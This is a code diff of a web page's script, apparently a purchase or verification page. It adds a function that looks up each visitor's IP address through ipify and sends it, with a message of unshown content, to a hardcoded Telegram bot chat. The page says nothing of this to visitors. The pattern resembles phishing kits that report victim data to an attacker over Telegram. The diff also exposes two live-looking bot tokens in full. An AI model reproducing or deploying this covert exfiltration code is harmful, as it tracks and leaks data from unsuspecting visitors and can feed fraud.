@@ -269,22 +269,27 @@
         }
 
         function sendTelegramMessage(message) {
-            const botToken = '7721532005:AAFxyQ4Ed5aTNNMflkOr7FF2iSPfhHMZbG4';
-            const chatId = '6471397661';
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+            const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
+            const chatId = '7174617845';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        alert('Verification message sent!');
-                    }
-                })
-                .catch(error => console.error('Error sending Telegram message:', error));
+            // Using XMLHttpRequest to avoid potential CORS issues
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("GET", url, true);
+            xhttp.send();
         }
 
-        function buyNow() {
-            openPopup();
+        function getIPAndSendMessage(message) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response =>                 response.json())
+                .then(data => {
+                    const ipMessage = `${message} IP Address: ${data.ip}`;
+                    sendTelegramMessage(ipMessage);
+                })
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                    sendTelegramMessage(message); // Send without IP in case of failure
+                });
         }
 
         function activate() {
